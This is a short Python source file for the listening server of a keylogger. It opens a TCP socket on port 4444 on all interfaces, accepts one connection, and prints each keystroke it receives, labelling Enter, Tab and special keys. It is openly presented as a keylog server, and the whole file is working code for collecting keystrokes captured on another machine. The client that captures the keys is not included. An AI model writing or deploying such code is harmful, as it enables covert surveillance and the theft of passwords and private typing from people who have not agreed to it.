import socket
import string


def start_keylog_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '0.0.0.0'
    port = 4444

    try:
        server_socket.bind((host, port))
        server_socket.listen(1)
        print(f"Keylog server listening on {host}:{port}")
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address}")

        while True:
            try:
                char = client_socket.recv(1)
                if not char:
                    print("\nConnection closed by client.")
                    break
                try: # Try treating the Character as ASCII, Looking for spaces, tabs and enters
                    char = char.decode('utf-8')
                    if char in string.printable:
                        if char.isprintable() and char not in string.whitespace:
                            print(f"{char}", end='', flush=True)
                        elif char == '\r':
                            print(f"\n<ENTER>")
                        elif char == '\t':
                            print(f"<TAB>", end='', flush=True)
                        else:
                            print(f"[{ord(char)}]", end='', flush=True)
                    else:
                        print(f"[{ord(char)}]", end='', flush=True)
                except: # If it's a shift or another non-printable Key
                    print("__Special_Key__")
            except ConnectionResetError:
                print("\nConnection reset by client.")
                break
            except Exception as e:
                print(f"\nAn error occurred: {e}")
                break

    except KeyboardInterrupt:
        print("\nServer shutting down...")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if 'client_socket' in locals():
            client_socket.close()
        server_socket.close()


if __name__ == "__main__":
    start_keylog_server()